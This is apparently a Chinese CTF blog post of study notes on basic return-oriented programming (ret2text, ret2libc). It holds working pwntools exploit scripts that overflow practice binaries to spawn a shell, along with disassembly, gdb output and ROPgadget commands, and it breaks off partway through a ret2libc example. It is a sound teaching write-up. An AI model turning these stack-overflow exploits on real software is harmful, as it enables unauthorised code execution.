<!-- build time:Tue Apr 02 2024 18:57:38 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="は永遠に不滅である" href="http://4rih04x.fun/rss.xml"><link rel="alternate" type="application/atom+xml" title="は永遠に不滅である" href="http://4rih04x.fun/atom.xml"><link rel="alternate" type="application/json" title="は永遠に不滅である" href="http://4rih04x.fun/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Pwn"><link rel="canonical" href="http://4rih04x.fun/CTF/Pwn/note/Pwn1/"><title>Pwn复习-初级ROP - 笔记 - Pwn - CTF | Bomb_4riH04X = は永遠に不滅である = 击碎沉睡的灵魂！</title><meta name="generator" content="Hexo 7.0.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Pwn复习-初级ROP</h1><div class="meta"><span class="item" title="创建时间：2023-11-08 10:38:07"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-11-08T10:38:07+08:00">2023-11-08</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>13k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>12 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Bomb_4riH04X</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="/images/large/6833939bly1giph4fomxoj20zk0m8axp.jpg"></li><li class="item" data-background-image="/images/large/6833939bly1giciukx8a7j20zk0m8aio.jpg"></li><li class="item" data-background-image="/images/large/6833939bly1gicis3attqj20zk0m8k7l.jpg"></li><li class="item" data-background-image="/images/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li><li class="item" data-background-image="/images/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li><li class="item" data-background-image="/images/large/6833939bly1gipeuv80yoj20zk0m8kjl.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/Pwn/" itemprop="item" rel="index" title="分类于 Pwn"><span itemprop="name">Pwn</span></a><meta itemprop="position" content="2"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/Pwn/note/" itemprop="item" rel="index" title="分类于 笔记"><span itemprop="name">笔记</span></a><meta itemprop="position" content="3"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://4rih04x.fun/CTF/Pwn/note/Pwn1/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="4riH04X"><meta itemprop="description" content="击碎沉睡的灵魂！, 我们从不回头"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="は永遠に不滅である"></span><div class="body md" itemprop="articleBody"><p></p><meta name="referrer" content="no-referrer"><p></p><h2 id="一rop编程介绍"><a class="anchor" href="#一rop编程介绍">#</a> 一.ROP 编程介绍</h2><p>​	随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP (Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>​	之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件：</p><p>1. 程序存在溢出，并且可以控制返回地址。</p><p>2. 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p><p>3. 如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h2 id="二ret2text"><a class="anchor" href="#二ret2text">#</a> 二.ret2text</h2><h3 id="1原理"><a class="anchor" href="#1原理">#</a> 1. 原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><p>注： ret2text 即控制返回地址指向程序本身已有的的代码 (.text) 并执行</p><h3 id="2x64和x86函数调用方式不同导致ret2text布栈不同"><a class="anchor" href="#2x64和x86函数调用方式不同导致ret2text布栈不同">#</a> 2.x64 和 x86 函数调用方式不同导致 ret2text 布栈不同</h3><h4 id="21函数调用约定"><a class="anchor" href="#21函数调用约定">#</a> 2.1 函数调用约定</h4><p><strong>_cdecl: c/c++ 默认方式，参数从右向左入栈，主调函数负责栈平衡。</strong></p><p><strong>_stdcall: Windows API 方式，参数从右向左入栈，被调函数负责栈平衡。</strong></p><p><strong>_fastcall: 快速调用方式。即将参数优先从寄存器传入（ecx 和 edx），剩下的参数从右向左入栈。由于栈位于内存区域，而寄存器位于 cpu 内，存取快于内存。</strong></p><p>这里讲述默认的 gcc 调用约定_cdecl 的一些特点。</p><p><img data-src="https://gitee.com/murry_ari/murray/raw/master/images/image-20231112225346779.png" alt="image-20231112225346779"></p><p>x86</p><ul><li>使用栈传递参数</li><li>使用 eax 存放返回值</li></ul><p>x64</p><ul><li>前六个参数依次存放于 rdi，rsi，rdx，rcx，r8，r9 中</li><li>多余的参数存放于栈中</li></ul><h3 id="3解法举例"><a class="anchor" href="#3解法举例">#</a> 3. 解法举例</h3><hr><h4 id="31x86题解方法"><a class="anchor" href="#31x86题解方法">#</a> 3.1x86 题解方法</h4><p>对于函数传参的函数，其栈格式为：</p><p><img data-src="https://gitee.com/murry_ari/murray/raw/master/images/image-20231108110345769.png" alt="image-20231108110345769" style="zoom:50%"></p><p>故而我们需要利用溢出覆盖返回地址进入 func 函数内部，再将参数一指向 “/bin/sh” 的储存地址即可。其中要注意的是 r 处需要我们进行垃圾数据的填充。</p><p>现在利用 gdb 查找 func 函数地址和 sh 存放地址（具体偏移量由 ida 查看不再详细讲解）</p><p><img data-src="https://gitee.com/murry_ari/murray/raw/master/images/01c0d9fdf5c64c608eae79fcb57d1b1d.png" alt=""></p><p>注意这种 x86 是要进入 func 函数，然后把参数一覆盖成 bin/sh, 因此有三个参数，payload = padding*b'a' + p32 (ret_addr) + p32 (0) + p32 (sh_addr)</p><p>书写 payload：</p><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">`</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;./ret2text_func2_x86&#x27;</span>    </span><br><span class="line">io = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">rop = ROP(file)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x804c018</span></span><br><span class="line">ret_addr = elf.symbols[<span class="string">&#x27;func&#x27;</span>]</span><br><span class="line">padding = <span class="number">0x14</span></span><br><span class="line">    </span><br><span class="line">payload = padding*<span class="string">b&#x27;a&#x27;</span> + p32(ret_addr) + p32(<span class="number">0</span>) + p32(sh_addr) </span><br><span class="line">    </span><br><span class="line">dem = <span class="string">b&#x27;inputs:&#x27;</span></span><br><span class="line">io.sendlineafter(dem,payload)</span><br><span class="line">io.interactive()</span><br><span class="line">`</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>成功</p><hr><h4 id="32x64解题方法"><a class="anchor" href="#32x64解题方法">#</a> 3.2x64 解题方法</h4><p>对 x64 的参数，大部分情况下，前六个参数储存在寄存器内，无法直接使用简单的栈溢出修改寄存器内容，这时候我们需要解除 ROPgadget 工具进行辅助。</p><p>ROP (Return Oriented Programming)，即返回导向编程，通过栈溢出内容覆盖返回地址，使其跳转到可执行文件中已有的片段代码中执行我们选择的代码段。</p><p>知道了 ROP 工具的功能，我们需要做的是</p><ol><li>修改 rdi 的值（可使用代码 pop rdi ; ret）</li><li>在栈中放入‘bin/sh’经由 pop 提交给 rdi</li><li>进入 func 函数内调用 system 函数</li></ol><p>利用 gdb 查找 func 函数地址和 sh 存放地址（具体偏移量由 ida 查看不再详细讲解）：</p><p>利用 ROPgadget 查找需要的代码行 --pop rdi ; ret</p><p></p><figure class="highlight bash"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2text_func2_x64 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure><p></p><p>payload = padding*b'a' + p64 (pop_rdi_ret) + p64 (sh_addr)+ p64 (ret_addr) #64 位三步走原则</p><p>构造 payload：</p><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">`</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#context(arch=&#x27;arm64&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#打开路径</span></span><br><span class="line">file = <span class="string">&#x27;./ret2text_func2_x64&#x27;</span>   </span><br><span class="line">io = process(file)   </span><br><span class="line">elf = ELF(file)   </span><br><span class="line">rop = ROP(file)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#调试</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x404028</span>    </span><br><span class="line">ret_addr = elf.symbols[<span class="string">&#x27;func&#x27;</span>]  <span class="comment">#这个可以自己找，也可以调用函数帮你找    </span></span><br><span class="line">pop_rdi_ret = <span class="number">0x40121b</span>    <span class="comment">#这个用gadget就行    </span></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = padding*<span class="string">b&#x27;a&#x27;</span> + p64(pop_rdi_ret) + p64(sh_addr)+ p64(ret_addr) <span class="comment">#64位三步走原则</span></span><br><span class="line">    </span><br><span class="line">dem = <span class="string">b&#x27;inputs:&#x27;</span>   </span><br><span class="line">io.sendlineafter(dem,payload)   </span><br><span class="line">io.interactive()</span><br><span class="line">`</span><br></pre></td></tr></table></figure><p></p><p>运行成功 pwn 掉</p><hr><h4 id="33x86举例"><a class="anchor" href="#33x86举例">#</a> 3.3x86 举例</h4><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p><p>首先，查看一下程序的保护机制</p><p></p><figure class="highlight bash"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2text checksec ret2text</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p></p><p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p><p></p><figure class="highlight c"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p><p></p><figure class="highlight c"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">080485F</span>D secure          proc near</span><br><span class="line">.text:<span class="number">080485F</span>D</span><br><span class="line">.text:<span class="number">080485F</span>D input           = dword ptr <span class="number">-10</span>h</span><br><span class="line">.text:<span class="number">080485F</span>D secretcode      = dword ptr <span class="number">-0</span>Ch</span><br><span class="line">.text:<span class="number">080485F</span>D</span><br><span class="line">.text:<span class="number">080485F</span>D                 push    ebp</span><br><span class="line">.text:<span class="number">080485F</span>E                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">08048600</span>                 sub     esp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">08048603</span>                 mov     dword ptr [esp], <span class="number">0</span> ; timer</span><br><span class="line">.text:<span class="number">0804860</span>A                 call    _time</span><br><span class="line">.text:<span class="number">0804860F</span>                 mov     [esp], eax      ; seed</span><br><span class="line">.text:<span class="number">08048612</span>                 call    _srand</span><br><span class="line">.text:<span class="number">08048617</span>                 call    _rand</span><br><span class="line">.text:<span class="number">0804861</span>C                 mov     [ebp+secretcode], eax</span><br><span class="line">.text:<span class="number">0804861F</span>                 lea     eax, [ebp+input]</span><br><span class="line">.text:<span class="number">08048622</span>                 mov     [esp+<span class="number">4</span>], eax</span><br><span class="line">.text:<span class="number">08048626</span>                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:<span class="number">0804862</span>D                 call    ___isoc99_scanf</span><br><span class="line">.text:<span class="number">08048632</span>                 mov     eax, [ebp+input]</span><br><span class="line">.text:<span class="number">08048635</span>                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:<span class="number">08048638</span>                 jnz     <span class="type">short</span> locret_8048646</span><br><span class="line">.text:<span class="number">0804863</span>A                 mov     dword ptr [esp], offset command ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">08048641</span>                 call    _system</span><br></pre></td></tr></table></figure><p></p><p>在 secure 函数又发现了存在调用 system (&quot;/bin/sh&quot;) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。</p><p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p><p></p><figure class="highlight c"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">080486</span>A7                 lea     eax, [esp+<span class="number">1</span>Ch]</span><br><span class="line">.text:<span class="number">080486</span>AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:<span class="number">080486</span>AE                 call    _gets</span><br></pre></td></tr></table></figure><p></p><p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下</p><p></p><figure class="highlight bash"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">gef➤  r</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae <span class="keyword">in</span> main () at ret2text.c:24</span><br><span class="line">24      gets(buf);</span><br></pre></td></tr></table></figure><p></p><p>────────────────────────────────────────────────────────────────</p><p></p><figure class="highlight lisp"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">──────[ registers ]────</span><br><span class="line">$eax   : <span class="number">0</span>xffffcd5c  →  <span class="number">0</span>x08048329  →  <span class="string">&quot;__libc_start_main&quot;</span></span><br><span class="line">$ebx   : <span class="number">0</span>x00000000</span><br><span class="line">$ecx   : <span class="number">0</span>xffffffff</span><br><span class="line">$edx   : <span class="number">0</span>xf7faf870  →  <span class="number">0</span>x00000000</span><br><span class="line">$esp   : <span class="number">0</span>xffffcd40  →  <span class="number">0</span>xffffcd5c  →  <span class="number">0</span>x08048329  →  <span class="string">&quot;__libc_start_main&quot;</span></span><br><span class="line">$ebp   : <span class="number">0</span>xffffcdc8  →  <span class="number">0</span>x00000000</span><br><span class="line">$esi   : <span class="number">0</span>xf7fae000  →  <span class="number">0</span>x001b1db0</span><br><span class="line">$edi   : <span class="number">0</span>xf7fae000  →  <span class="number">0</span>x001b1db0</span><br><span class="line">$eip   : <span class="number">0</span>x080486ae  →  &lt;main+102&gt; call <span class="number">0</span>x8048460 &lt;gets@plt&gt;</span><br></pre></td></tr></table></figure><p></p><p>可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 esp+0x1c，因此，我们可以推断</p><p>s 的地址为 0xffffcd5c<br>s 相对于 ebp 的偏移为 0x6c<br>s 相对于返回地址的偏移为 0x6c+4<br>最后的 payload 如下：</p><p>这种 x86 直接就是主函数中有输入函数，具体题目中二者区别不大，有时都能打通</p><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p></p><hr><h4 id="33x86题解补充疑问为什么加p320-栈对齐"><a class="anchor" href="#33x86题解补充疑问为什么加p320-栈对齐">#</a> 3.3x86 题解补充疑问（为什么加 p32 (0)）- 栈对齐</h4><p>对于本题的函数传参，我们的栈帧构造初步想法如图</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>ebp</td><td>‘aaaa’</td></tr><tr><td>r</td><td>return to func</td></tr><tr><td>参数一</td><td>“/bin/sh”</td></tr></tbody></table><ol><li>输入适量垃圾填充 padding * b 'a'</li><li>覆盖返回地址指向 func 函数 p32 (ret_addr)</li><li>参数 &quot;/bin/sh&quot; 地址</li></ol><p>则 payload = padding*b'a' + p32 (ret_addr) + p32 (sh_addr)</p><p>然而这样的脚本在攻击时会出错。原因在于：</p><p>正常的函数调用 call 来达到 push eip；jmp 的作用，经过初步 payload 构造的攻击如下图所示，是通过覆盖 return 达到 jmp 的作用的，并没有像 call 一样 push eip 到栈中。</p><p><img data-src="https://gitee.com/murry_ari/murray/raw/master/images/image-20231112225516704.png" alt="image-20231112225516704" style="zoom:50%"></p><p>故而 ret 执行后，ebp 后为我们输入的参数而非 eip 原地址（函数结束后返回的地址），而函数读取参数的位置在上文中已经展示，为 ebp+0x8。故而在利用 ret2text 覆盖 pwn 题时候，需要自行加入一行栈帧的填充。</p><p><img data-src="https://gitee.com/murry_ari/murray/raw/master/images/image-20231112225530054.png" alt="image-20231112225530054" style="zoom:50%"></p><h2 id="三ret2libc"><a class="anchor" href="#三ret2libc">#</a> 三.ret2libc</h2><h3 id="i灵魂五问"><a class="anchor" href="#i灵魂五问">#</a> I. 灵魂五问</h3><p><strong>1. 没有写 system 就一定没有 system？</strong><br>答：有 system， 在 libc 里面，别人写好的</p><p><strong>2. 怎找到 libc 基地址 ？</strong><br>答：使用输出 libc 其中的函数地址，从而计算基地址</p><p><strong>3. 怎么输出 libc 其中的函数地址？</strong><br>答：模仿程序如何找 libc 其中的函数地址的方式去寻找。</p><p><strong>4. 怎把 GOT 表项内容打印出来。</strong><br>答：利用输出函数泄露 got 表内容。</p><p><strong>5. 怎么找到 system binsh 地址</strong><br>答：利用偏移计算</p><p><strong>常用会用到的指令：</strong></p><p></p><figure class="highlight bash"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`readelf -a b|less  <span class="comment"># </span></span><br><span class="line">ROPgadget --binary 文件名 --only <span class="string">&quot;pop|ret&quot;</span>  <span class="comment">#找特定gadget#寄存器</span></span><br><span class="line">ldd 文件名 <span class="comment">#看动态链接</span></span><br></pre></td></tr></table></figure><p></p><h3 id="ii自己的理解"><a class="anchor" href="#ii自己的理解">#</a> II. 自己的理解</h3><p><strong>1. 我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</strong></p><p>​	system 函数属于 libc，而 <span class="exturl" data-url="aHR0cDovL2xpYmMuc28=">libc.so</span> 动态链接库中的函数之间相对偏移是固定的。<br>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集<br>​ 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p><strong>2. 那么如何得到 libc 中的某个函数的地址呢？</strong></p><p>​	我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。<br>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpZWFudS9MaWJjU2VhcmNoZXI=">https://github.com/lieanu/LibcSearcher</span><br>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p><p>这里我们泄露 libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下<br>1. 泄露 libc_start_main 地址<br>2. 获取 libc 版本<br>3. 获取 system 地址与 /bin/sh 的地址<br>4. 再次执行源程序<br>5. 触发栈溢出执行 system (‘/bin/sh’)**</p><h3 id="iii解法举例"><a class="anchor" href="#iii解法举例">#</a> III. 解法举例</h3><h3 id="1x64"><a class="anchor" href="#1x64">#</a> 1)x64:</h3><h3 id="0调用约定"><a class="anchor" href="#0调用约定">#</a> 0. 调用约定</h3><p>64 位系统中使用寄存器传递参数：rdi、rsi、rdx、rcx、r8、r9（1-6 个参数）<br>参考：<span class="exturl" data-url="aHR0cDovL2FiY2R4eXprLmdpdGh1Yi5pby9ibG9nLzIwMTIvMTEvMjMvYXNzZW1ibHktYXJncy8=">http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/</span><br>要构造 write (1,buf2,20)，需要控制 3 个参数：rdi、rsi、rdx，<br>第 3 个参数代表输出的 size，如果没有 rdx 的 gadget 可以暂时不管，输出多少无所谓，<br>在下面我们构造 payload 的时候，我们不写第 3 个参数</p><h4 id="01举例"><a class="anchor" href="#01举例">#</a> 0.1 举例</h4><p></p><figure class="highlight perl"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当我们覆盖到rbp后回忆函数调用的流程，把rbp的下一个地址开始原来存的东西覆盖成我们想要的地址</span><br><span class="line">第一次：                                                       第二次回到main</span><br><span class="line">----rbp(esp<span class="number">0</span>-<span class="number">16</span>)(ida-&gt;s)：覆盖完                                ----同理</span><br><span class="line">----esp<span class="number">0</span>-<span class="number">8</span>(ida-&gt;r): <span class="string">&quot;pop_rdi_rsi_rdxret&quot;</span>                       ----<span class="string">&quot;pop_rdi_ret&quot;</span></span><br><span class="line">----esp<span 